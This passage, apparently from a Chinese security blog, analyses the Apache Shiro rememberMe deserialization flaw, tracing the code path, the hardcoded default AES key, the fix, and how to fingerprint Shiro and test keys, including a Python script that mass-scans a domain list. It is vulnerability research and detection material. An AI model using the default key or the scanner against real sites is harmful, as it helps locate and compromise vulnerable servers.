<p>​    ShiroFilter是整个 Shiro 的入口点，用于拦截需要安全控制的请求进行处理，除了上面的基础拦截器类外，shiro还提供了一些比较常用的默认拦截器。</p>
<p>​    FormAuthenticationFilter登录拦截器，它主要有两个作用，一个是拦截登录表单提交的路径，创建登录认证所需要的Token令牌，并进入登录认证流程。另一个作用是拦截要求登录后才可以访问的路径，如果已经登录则直接进入到要访问路径，如果未登录则访问被拒绝并跳转到登录页。登录拦截器常用的方法如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">createToken创建认证令牌，令牌内存储了登录认证时所需的数据。</span><br><span class="line">onLoginSuccess设置登录成功后的行为。</span><br><span class="line">onAccessDenied设置被拒绝后的行为</span><br><span class="line">setLoginUrl设置登录地址</span><br><span class="line">getUsername获取登录名，表单name值必须是username。</span><br><span class="line">getPassword获取密码，表单name值必须是password。</span><br></pre></td></tr></table></figure>

<p>​    UserFilter用户拦截器，用户已经登录认证 或 已经记住我 的都可以通过。</p>
<p>​    AnonymousFilter无需认证即可通过。</p>
<h4 id="拦截器链"><a href="#拦截器链" class="headerlink" title="拦截器链"></a><strong>拦截器链</strong></h4><p>​    Shiro 对 Servlet 容器的 FilterChain 进行了代理，即 ShiroFilter 在继续 Servlet 容器的 Filter 链的执行之前，通过 ProxiedFilterChain 对 Servlet 容器的 FilterChain 进行了代理。当Filter执行的过程中，首先执行shiro的拦截器链，再经过Servlet容器的拦截器链。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143520958.png" alt="image-20201129143520958"></p>
<p>​    在shiro中提供了PathMatchingFilterChainResolver来判断请求的url和拦截器的规则是否匹配。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129143926553.png" alt="image-20201129143926553"></p>
<p>​    DefaultFilterChainManager中维护者一个拦截器链，我们可以通过DefaultFilterChainManager中的方法添加拦截器。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129144850395.png" alt="image-20201129144850395"></p>
<h4 id="ShiroFilterFactoryBean"><a href="#ShiroFilterFactoryBean" class="headerlink" title="ShiroFilterFactoryBean"></a><strong>ShiroFilterFactoryBean</strong></h4><p>​    通过ShiroFilterFactoryBean类可以方便的配置拦截器的各种基本属性。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">setSecurityManager:注入一个SecurityManager类，SecurityManager负责管理整个shiro核心验证功能。</span><br><span class="line">setLoginUrl：配置登录页路径。</span><br><span class="line">setSuccessUrl：配置登录成功页路径。</span><br><span class="line">setUnauthorizedUrl：配置没有权限跳转的页面。</span><br><span class="line">setFilterChainDefinitionMap：设置拦截规则。拦截规则是通过一个Map进行导入的。</span><br><span class="line">setFilters：用于注入自己实现的拦截器类。</span><br></pre></td></tr></table></figure>

<p>​    拦截规则是通过MAP来进行设置的，基本形式如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, String&gt; filterChainDefinitionMap &#x3D; new LinkedHashMap&lt;String, String&gt;();</span><br><span class="line">filterChainDefinitionMap.put(&quot;&lt;拦截路径&gt;&quot;, &quot;&lt;拦截器名称&gt;&quot;);</span><br></pre></td></tr></table></figure>

<p>​    拦截器路径是一个从根路径开始的url，并支持通配符。拦截器名称既可以是shiro内置拦截器的名称比如anon(无需认证的拦截器)、authc（需要认证的拦截器）、user (已经登录成功或使用记住我的拦截器)，perms[role_name] - 需要权限验证的路径使用perms拦截器。中括号内为权限名称列表。</p>
<hr>
<p>​    接下来我们看一下shiroConfig.java，这个类是shiro的配置类，在这个类的shiroFilterFactoryBean中，通过setSecurityManager来设置securityManager，在securityManager中，设置了Realm为我们自己定义的mainRealm，RememberMeManager为cookieRememberMeManager，也就是cookie的”记住我”功能。通过setLoginUrl方法来设置未登录时需要认证的地址也就是登录地址。setUnauthorizedUrl方法来设置无权访问时跳转的地址。通过创建LinkedHashMap，设置map.put(“/doLogin”, “anon”)来设置不需要登录就能访问的地址。通过map.put(“/xxx/**”, “user”);来设置用户登录后才能访问的地址。最后通过setFilterChainDefinitionMap将这个map设置到FilterChain中。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129134331085.png" alt="image-20201129134331085"></p>
<h4 id="Subject"><a href="#Subject" class="headerlink" title="Subject"></a><strong>Subject</strong></h4><p>​    Shiro中认证授权组件Subject，为我们提供了当前用户、角色和授权的相关信息，可以进行登录，退出，权限验证，获取用户信息，session。</p>
<p>​    通过SecurityUtils.getSubject获取subject对象</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Subject subject &#x3D; SecurityUtils.getSubject();</span><br></pre></td></tr></table></figure>

<p>​    subject包含如下主要接口：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Subject login(Subject subject, AuthenticationToken authenticationToken) throws AuthenticationException;    &#x2F;&#x2F;登陆</span><br><span class="line">void logout(Subject subject);        &#x2F;&#x2F;退出登陆</span><br><span class="line">Subject createSubject(SubjectContext context);    &#x2F;&#x2F;获取subject</span><br><span class="line">Session session &#x3D; subject.getSession(); &#x2F;&#x2F;获取session对象</span><br><span class="line">String currentUser &#x3D; subject.getPrincipal().toString(); &#x2F;&#x2F;获取登录名</span><br></pre></td></tr></table></figure>

<p>​    了解了这些知识，我们看下UserController.java是如何实现的，通过SecurityUtils.getSubject方法获取subject对象，通过login来进行登录，传入的参数为UsernamePasswordToken对象。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201129153131427.png" alt="image-20201129153131427"></p>
<p>​    这里，shiro的基础知识我们大概了解了一些了，下面我们再看一下漏洞。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>​    因为之前已经有人分析过shiro的反序列化漏洞了，并且在文章中给出了存在反序列化漏洞的方法，在DefaultSerializer类的deserialize方法中，因此我们可以直接找到这个方法并打上断点 。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130114316497.png" alt="image-20201130114316497"></p>
<p>​    在这个函数中调用了ObjectInputStream类的readObject方法来进行反序列化操作，下面是整个过程的调用栈</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">deserialize:75, DefaultSerializer (org.apache.shiro.io)</span><br><span class="line">deserialize:514, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">convertBytesToPrincipals:431, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedPrincipals:396, AbstractRememberMeManager (org.apache.shiro.mgt)</span><br><span class="line">getRememberedIdentity:604, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">resolvePrincipals:492, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">createSubject:342, DefaultSecurityManager (org.apache.shiro.mgt)</span><br><span class="line">buildSubject:846, Subject$Builder (org.apache.shiro.subject)</span><br><span class="line">buildWebSubject:148, WebSubject$Builder (org.apache.shiro.web.subject)</span><br><span class="line">createSubject:292, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilterInternal:359, AbstractShiroFilter (org.apache.shiro.web.servlet)</span><br><span class="line">doFilter:125, OncePerRequestFilter (org.apache.shiro.web.servlet)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:100, RequestContextFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:93, FormContentFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilterInternal:201, CharacterEncodingFilter (org.springframework.web.filter)</span><br><span class="line">doFilter:119, OncePerRequestFilter (org.springframework.web.filter)</span><br><span class="line">internalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">doFilter:166, ApplicationFilterChain (org.apache.catalina.core)</span><br><span class="line">invoke:202, StandardWrapperValve (org.apache.catalina.core)</span><br><span class="line">invoke:96, StandardContextValve (org.apache.catalina.core)</span><br><span class="line">invoke:526, AuthenticatorBase (org.apache.catalina.authenticator)</span><br><span class="line">invoke:139, StandardHostValve (org.apache.catalina.core)</span><br><span class="line">invoke:92, ErrorReportValve (org.apache.catalina.valves)</span><br><span class="line">invoke:74, StandardEngineValve (org.apache.catalina.core)</span><br><span class="line">service:343, CoyoteAdapter (org.apache.catalina.connector)</span><br><span class="line">service:367, Http11Processor (org.apache.coyote.http11)</span><br><span class="line">process:65, AbstractProcessorLight (org.apache.coyote)</span><br><span class="line">process:860, AbstractProtocol$ConnectionHandler (org.apache.coyote)</span><br><span class="line">doRun:1591, NioEndpoint$SocketProcessor (org.apache.tomcat.util.net)</span><br><span class="line">run:49, SocketProcessorBase (org.apache.tomcat.util.net)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure>

<p>​    下面我们分析一下这个漏洞的调用过程，再调用的过程中，我们可以看到拦截器的调用链，已经将shiroFilter写入到tomcat拦截器之前。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130155604254.png" alt="image-20201130155604254"></p>
<p>​    下面依次调用对应的拦截器，OrderedCharacterEncodingFilter–&gt;OrderedFormContentFilter–&gt;OrderedRequestContextFilter–&gt;ShiroFilterFactoryBean–&gt;WsFilter。</p>
<p>​    首先调用OrderedCharacterEncodingFilter设置编码</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161156440.png" alt="image-20201130161156440"></p>
<p>​    调用OrderedFormContentFilter获取参数，这里参数为空，因此会调用else中的代码。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130161341690.png" alt="image-20201130161341690"></p>
<p>​    调用OrderedRequestContextFilter完成requestContext的初始化操作。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130162453138.png" alt="image-20201130162453138"></p>
<p>​    下来就是shiorFilter的调用链，再shior拦截器中调用了createSubject来创建subject对象。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163400707.png" alt="image-20201130163400707"></p>
<p>​    跟进createSubject方法，调用了buildWebSubject方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163533846.png" alt="image-20201130163533846"></p>
<p>​    在 buildWebSubject中调用了其父类的buildSubject方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130163606923.png" alt="image-20201130163606923"></p>
<p>​    跟进父类的buildSubject方法，调用了DefaultSecurityManager的createSubject方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165013406.png" alt="image-20201130165013406"></p>
<p>​    继续跟进，我们需要关注resolvePrincipals方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130165132350.png" alt="image-20201130165132350"></p>
<p>​    跟进resolvePrincipals方法，判断RememberMeManager是否为空，不为空则调用getRememberedPrincipals。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170513136.png" alt="image-20201130170513136"></p>
<p>​    跟进getRememberedPrincipals方法，首先调用了getRememberedSerializedIdentity。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130170719001.png" alt="image-20201130170719001"></p>
<p>​    跟进getRememberedSerializedIdentity方法，在该方法中，通过this.getCookie().readValue(request, response);获取了cookie的内容，并且判断是否为deleteMe，若为DeleteMe则返回null,否则将继续执行，对获取的cookie的内容进行base64解码并返回。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171245277.png" alt="image-20201130171245277"></p>
<p>​        返回后会判断获取的cookie的内容是否为空，如果不为空，则调用convertBytesToPrincipals方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171552207.png" alt="image-20201130171552207"></p>
<p>​    在convertBytesToPrincipals调用了decrypt对cookie的内容进行解密。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171453470.png" alt="image-20201130171453470"></p>
<p>​    在decrypt中，调用cipherService.decrypt进行解密，同时传入了this.getDecryptionCipherKey()的内容。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171804561.png" alt="image-20201130171804561"></p>
<p>​    我们看一下getDecryptionCipherKey中的key是如何来的，返回了当前对象的decryptionCipherKey属性。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130171919629.png" alt="image-20201130171919629"></p>
<p>​    decryptionCipherKey是在setDecryptionCipherKey中设置的。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172056694.png" alt="image-20201130172056694"></p>
<p>​    在setCipherKey中调用了setDecryptionCipherKey进行设置、</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172145175.png" alt="image-20201130172145175"></p>
<p>​    setCipherKey中的参数来自于DEFAULT_CIPHER_KEY_BYTES，而这个值是kPH+bIxk5D2deZiIxcaaaA== base64解密后的内容，所以这个key的内容在我们当前的环境下是写死的。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130172223454.png" alt="image-20201130172223454"></p>
<p>​    继续跟进解密算法，可以看到使用的解密方式是AES方式。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130173904974.png" alt="image-20201130173904974"></p>
<p>​    将解密后的结果返回后，再转换为字节数组的形式并返回。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174140275.png" alt="image-20201130174140275"></p>
<p>​    将返回的bytes作为参数传递到deserialize方法中。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174259064.png" alt="image-20201130174259064"></p>
<p>​    继续跟踪下面的调用</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174337766.png" alt="image-20201130174337766"></p>
<p>​    最终我们可以看到，将我们通过cookie传入的内容转换为ObjectInputStream,并调用了readObject进行反序列化操作。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130174508646.png" alt="image-20201130174508646"></p>
<p>​    通过上面的分析，我相信我们已经对于shiro反序列化漏洞的基本原理有了大致的了解，这个漏洞要想正常的利用，至关重要的一点是找到解密cookie中传入payload的key，在这个环境中，key是写死的，实际上这个key也可以自己在shiorconfig类中配置加密的key。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180331183.png" alt="image-20201130180331183"></p>
<p>​    当我们更换key后，再去利用这个漏洞，由于key不正确无法解密导致无法继续利用。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180538186.png" alt="image-20201130180538186"></p>
<p>​    既然重新生成key这么简单，为什么还是有人使用默认的key或者网上公布的其他key？我们看一下这个key解密后的结果就知道了，由于这些key解密后都是一些乱码，不太容易编辑，所以可能很多人会去使用网上别人生成好的key，所以在漏洞利用的过程中有人想到了爆破key的方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201130180951079.png" alt="image-20201130180951079"></p>
<p>​    那如果想自己生成key,怎样生成才能满足要求呢,只要使用任意一个16位，24位，32位的字符串base64编码后都是可以作为key的。</p>
<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>​        我们尝试切换shiro为高版本，看一下shiro是如何修复反序列化漏洞的，我切换到1.2.7版本的shiro，我们可以看到在该版本中，key默认并不是写死的，而是由cipherService.generateNewKey().getEncoded()来生成的key。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164200537.png" alt="image-20201201164200537"></p>
<p>​    生成key的代码如下</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201164541425.png" alt="image-20201201164541425"></p>
<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><h4 id="如何识别shiro"><a href="#如何识别shiro" class="headerlink" title="如何识别shiro?"></a><strong>如何识别shiro?</strong></h4><p>​        要检测一个shiro是否存在反序列化漏洞，首先需要对shiro这个框架做一个识别，目前大部分的方法都是通过rememberMe=deleteMe;来识别的，但是并不是我们请求的所有地址都会返回rememberMe=deleteMe,但是在实战中我们可能需要批量去检测shiro框架，我们该如何识别？</p>
<p>​        通过之前的分析我们知道，无论我们访问哪个url，都会经过shiro的拦截器，而在shiro的拦截器中会获取cookie中rememberMe的内容并进行解密，并且通过之前的分析，我们知道解密是由convertBytesToPrincipals（）完成的，如果我们传入的rememberMe不能正常的反序列化，就会抛出异常，调用onRememberedPrincipalFailure方法。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170537270.png" alt="image-20201201170537270"></p>
<p>​    该方法经过几层调用最终调用了this.getCookie().removeFrom(request, response);方法</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170614952.png" alt="image-20201201170614952"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170630060.png" alt="image-20201201170630060"></p>
<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170639745.png" alt="image-20201201170639745"></strong></p>
<p>​    在removeFrom中，会在返回包header加上rememberMe=deleteMe，因此无论我们访问任何使用了shiro框架的路由，只需要在请求头中的cookie中加入rememberMe=xxx，如果目标使用了shiro，则会返回rememberMe=deleteMe，也就是说我们可以通过一个包来识别是否使用了shiro框架。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170725328.png" alt="image-20201201170725328"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201170959832.png" alt="image-20201201170959832"></p>
<p>​    了解了这些，我们可以写一个简单的python脚本来批量识别shiro，这里注意我将重定向设置为false，否则我们在请求时会跟进302跳转，但跳转后的结果里可能没有rememberMe=deleteMe。<br><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180626070.png" alt="image-20201201180626070"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180604356.png" alt="image-20201201180604356"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">def shiroScan(url):</span><br><span class="line"></span><br><span class="line">    header&#x3D;&#123;</span><br><span class="line">        &#39;User-Agent&#39;:&#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.66 Safari&#x2F;537.36&#39;,</span><br><span class="line">        &#39;Accept&#39;:&#39;image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,image&#x2F;*,*&#x2F;*;q&#x3D;0.8&#39;,</span><br><span class="line">        &#39;Accept-Encoding&#39;:&#39;gzip, deflate&#39;,</span><br><span class="line">        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q&#x3D;0.9&#39;,</span><br><span class="line">        &#39;Cookie&#39;:&#39;rememberMe&#x3D;1&#39;,</span><br><span class="line">        &#39;Connection&#39;:&#39;close&#39;</span><br><span class="line">        &#125;</span><br><span class="line">    proxies &#x3D; &#123; &quot;http&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:8088&quot;, &quot;https&quot;: &quot;https:&#x2F;&#x2F;127.0.0.1:8088&quot;&#125;</span><br><span class="line">    resp&#x3D;requests.get(url&#x3D;url,headers&#x3D;header,proxies&#x3D;proxies,verify&#x3D;False,allow_redirects&#x3D;False)</span><br><span class="line">    for name, regex in resp.headers.items():</span><br><span class="line">        if &quot;rememberMe&#x3D;deleteMe&quot; in regex:</span><br><span class="line">            print(url+ &quot; is Shiro!!!&quot;)</span><br><span class="line">    </span><br><span class="line">   </span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    with open(&#39;domain.txt&#39;,&#39;r&#39;) as f:</span><br><span class="line">        lines&#x3D;f.readlines()</span><br><span class="line">        for i in lines:</span><br><span class="line">            domain&#x3D;i.strip(&#39;\n&#39;)</span><br><span class="line">            shiroScan(domain)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201201180705142.png" alt="image-20201201180705142"></p>
<h4 id="如何判断key是否正确？"><a href="#如何判断key是否正确？" class="headerlink" title="如何判断key是否正确？"></a><strong>如何判断key是否正确？</strong></h4><p>​    通过上面的测试我们知道当我们使用的加密key正确可以正常进行反序列化操作，即使key正确，但生成的内容无法正常反序列化，则还是会返回rememberMe=deleteMe，因为反序列化的操作是在convertBytesToPrincipals方法完成的，如果反序列化的过程中出现异常，还是会设置rememberMe=deleteMe这个请求头，因此我们测试key是否正确，需要找到一个可以不依赖第三方组件的java中默认存在且和jdk版本无关的类来进行反序列化。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094802148.png" alt="image-20201202094802148"></p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202094838261.png" alt="image-20201202094838261"></p>
<p>​        我尝试使用URLDNS来进行判断，虽然可以正常发起DNS请求，但 由于执行过程中的类型转换错误，因此还是会返回rememberMe=deleteMe。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202100922001.png" alt="image-20201202100922001"></p>
<p>​        我们正常的登录，看看正常登录过程中的反序列化的类是什么类型</p>
<p><strong><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104733807.png" alt="image-20201202104733807"></strong></p>
<p>​        使用这个rememberMe的内容利用，看shiro再进行反序列化的过程中反序列化的是哪个类？</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202104854538.png" alt="image-20201202104854538"></p>
<p>​        跟进后发现是反序列化了SimplePrincipalCollection类，所以我们只要创建一个SimplePrincipalCollection对应的对象进行序列化就可以了，当传入的序列化内容可以正常被解析，就不会出现rememberMe=deleteMe，因此可以通过这个特性来判断我们的key是否正确。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105111202.png" alt="image-20201202105111202"></p>
<p>​        我们查看一下ShiroExploit这个工具，看看他是怎么实现的。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105408945.png" alt="image-20201202105408945"></p>
<p>​    这个工具在检测key是否正确的过程中调用了ysoserial的ShiroCheck，可我去查看ysoserial的github项目，发现并没有这个选项，也就是这个是作者自己扩展编写的。我们反编译ShiroExploit自带的ysoserial，他的实现也非常简单，就是创建一个SimplePrincipalCollection对象。</p>
<p><img src="/2020/11/28/shiro-rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201202105609290.png" alt="image-20201202105609290"></p>
<h4 id="如何检测利用链？"><a href="#如何检测利用链？" class="headerlink" title="如何检测利用链？"></a>如何检测利用链？</h4><p>​        在JAVA的反序列化漏洞中，仅仅找到readObject反序列化并不一定能造成RCE，还有一点比较重要的是需要找到利用链，这个要具体展开讲需要依赖的知识点有点多，我之后会单独写一篇文章来讲解。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

        
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block home" lang="cn">
    <link itemprop="mainEntityOfPage" href="https://cangqingzhe.github.io/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="藏青">
      <meta itemprop="description" content="知行合一">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="藏青's BLOG">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/13/%E5%85%B3%E4%BA%8Esqlserver%E6%B3%A8%E5%85%A5%E5%8F%A6%E7%B1%BB%E6%8A%80%E5%B7%A7%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="post-title-link" itemprop="url">关于sqlserver注入另类技巧的学习</a>
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-11-13 16:50:19" itemprop="dateCreated datePublished" datetime="2020-11-13T16:50:19+08:00">2020-11-13</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
